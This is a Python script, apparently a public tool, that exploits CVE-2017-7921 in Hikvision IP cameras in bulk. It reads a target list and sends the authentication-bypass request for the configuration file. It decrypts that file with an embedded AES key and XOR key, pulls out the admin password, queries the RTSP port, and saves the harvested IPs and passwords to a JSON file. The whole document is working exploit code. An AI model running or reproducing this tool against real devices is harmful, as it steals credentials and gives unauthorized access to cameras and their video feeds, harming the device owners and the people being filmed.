#!/usr/bin/python3
# @Maptnh@ CVE-2017-7921 Auto Crack password
import json
import argparse
from itertools import cycle
from Crypto.Cipher import AES
import re
import os
import sys
import requests
import xml.etree.ElementTree as ET
from requests.exceptions import RequestException
from requests.auth import HTTPBasicAuth  

RED = "\033[31m"          
BRIGHT_RED = "\033[31;1m" 
RESET = "\033[0m"         

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

LOGO = '''                                  
            .------..------..------.
            |H.--. ||I.--. ||K.--. |
            | :/\: || (\/) || :/\: |
            | (__) || :\/: || :\/: |
            | '--'H|| '--'I|| '--'K|
            `------'`------'`------'                 
Maptnh@S-H4CK13  CVE-2017-7921 Auto Crack Hik Password
======================================================='''

NAMESPACE = {'hik': 'http://www.hikvision.com/ver20/XMLSchema'}

class hik_dec():
    def __init__(self):
        self.URL_SUFFIX = "/System/configurationFile?auth=YWRtaW46MTEK"
    
    def add_to_16(self, s):
        while len(s) % 16 != 0:
            s += b'\0'
        return s 

    def decrypt(self, ciphertext, hex_key='279977f62f6cfd2d91cd75b889ce0c9a'):
        key = bytes.fromhex(hex_key)
        ciphertext = self.add_to_16(ciphertext)
        cipher = AES.new(key, AES.MODE_ECB)
        plaintext = cipher.decrypt(ciphertext[AES.block_size:])
        return plaintext.rstrip(b"\0")

    def xore(self, data, key=bytearray([0x73, 0x8B, 0x55, 0x44])):
        return bytes(a ^ b for a, b in zip(data, cycle(key)))

    def strings(self, file):
        chars = r"A-Za-z0-9/\-:.,_$%'()[\]<> "
        shortestReturnChar = 2
        regExp = '[%s]{%d,}' % (chars, shortestReturnChar)
        pattern = re.compile(regExp)
        return pattern.findall(file)

    def read_ips_from_file(self, file_path):
        ip_list = []
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line:
                        continue
                    
                    if ':' in line:
                        ip, port_str = line.split(':', 1)
                        ip = ip.strip()
                        port_str = port_str.strip()
                        if port_str.isdigit():
                            port = int(port_str)
                            ip_list.append({"ip": ip, "port": port})
                        else:
                            port = 80
                            ip_list.append({"ip": ip, "port": port})
                            print(f"[!] Line {line_num}: Port '{port_str}' is not a valid number, using default port 80 for IP: {ip}")
                    else:
                        ip = line.strip()
                        port = 80
                        ip_list.append({"ip": ip, "port": port})
                        print(f"[!] Line {line_num}: Format error (not ip:port), using default port 80 for IP: {ip}")
            
            if not ip_list:
                print(f"[!] Warning: No valid IP:port entries read from {file_path}")
            else:
                print(f"[*] Successfully read {len(ip_list)} valid IP:port targets")
            return ip_list
        except FileNotFoundError:
            print(f"[!] Error: File {file_path} not found. Please verify the file path.")
            return []
        except Exception as e:
            print(f"[!] Error reading file: {str(e)}")
            return []

    def request_ip(self, ip, port=80):
        proto = "https" if port == 443 else "http"
        full_url = f"{proto}://{ip}:{port}{self.URL_SUFFIX}"
        try:
            response = requests.get(
                full_url, 
                timeout=10, 
                verify=False, 
                allow_redirects=False
            )  
            return response
        except RequestException as e:
            return None
    
    def find_last_list_index(self,lst, target):
        try:
            return len(lst) - 1 - lst[::-1].index(target)
        except ValueError:
            return -1
    
    def parse_xml_to_get_ports(self, xml_content):
        result = {
            'rtsp_port': 554
        }
        try:
            root = ET.fromstring(xml_content)
            for protocol_node in root.findall('hik:AdminAccessProtocol', NAMESPACE):
                protocol = protocol_node.find('hik:protocol', NAMESPACE).text
                port_no = protocol_node.find('hik:portNo', NAMESPACE).text
                if protocol.strip().upper() == 'RTSP':
                    result['rtsp_port'] = port_no
            return result
        except Exception as e:
            print(f"[!] XML parsing failed: {str(e)}")
            return result

    def get_device_ports(self, ip, port, password):
        url = f"http://{ip}:{port}/ISAPI/Security/adminAccesses"
        try:
            response = requests.get(
                url=url,
                auth=HTTPBasicAuth('admin', password),
                timeout=10,
                verify=False
            )
            
            if response.status_code == 200:
                return self.parse_xml_to_get_ports(response.text)
            else:
                return None
        except RequestException as e:
            return None

    def crack_password(self, ip, port):
        response = self.request_ip(ip, port)
        if response is None:
            return None
        
        if response.status_code == 200:
            try:
                binary_data = response.content
                decrypt_data = self.decrypt(binary_data)
                xor_data = self.xore(decrypt_data)
                data = self.strings(xor_data.decode('ISO-8859-1', errors='ignore'))
                base_index = self.find_last_list_index(data, 'admin')
                
                if base_index != -1 and base_index + 1 < len(data):
                    username = data[base_index]
                    password = data[base_index+1]
                    
                    port_info = self.get_device_ports(ip, port, password)
                    rtsp_port = port_info['rtsp_port'] if (port_info and port_info['rtsp_port']) else 554
                    
                    print(f"[+] {ip}:{port} => [{BRIGHT_RED}{username}:{password}{RESET}] | HTTP_PORT:{port} | RTSP_PORT:{rtsp_port}")
                    return (ip, password, port, rtsp_port) 
            except Exception as e:
                return None
        else:
            print(f"{ip} SKIP....")
            return None


def save_to_json(success_list, json_path="./data/hik.json"):
    dir_path = os.path.dirname(json_path)
    if not os.path.exists(dir_path):
        os.makedirs(dir_path, exist_ok=True)
    
    json_data = [
        {
            'IP': item[0],
            'HTTP_PORT': item[2],
            'RTSP_PORT': item[3],  
            'PASSWORD': item[1]
        } 
        for item in success_list if item
    ]
    
    try:
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(json_data, f, ensure_ascii=False, indent=4)
        print(f"[*] Successfully saved {len(json_data)} results to: {json_path}")
        return True
    except Exception as e:
        print(f"[!] Failed to save JSON: {str(e)}")
        return False


def main():
    print(LOGO)
    parser = argparse.ArgumentParser(description='CVE-2017-7921 Hikvision Password Cracker')
    parser.add_argument(
        '--ips', 
        type=str, 
        default="./target.txt",  
        help='IP:PORT list file path (default: ./target.txt)'
    )
    args = parser.parse_args()

    hik = hik_dec()
    success_list = []   
    
    ip_list = hik.read_ips_from_file(args.ips)
    if not ip_list:
        sys.exit(1)
    
    print(f"[*] Starting batch cracking...")
 
    for target in ip_list:
        ip = target['ip']
        port = target['port']
        result = hik.crack_password(ip, port)
        if result:   
            success_list.append(result)
    save_to_json(success_list)
    print("[*] Batch cracking process completed!")


if __name__ == "__main__":
    main()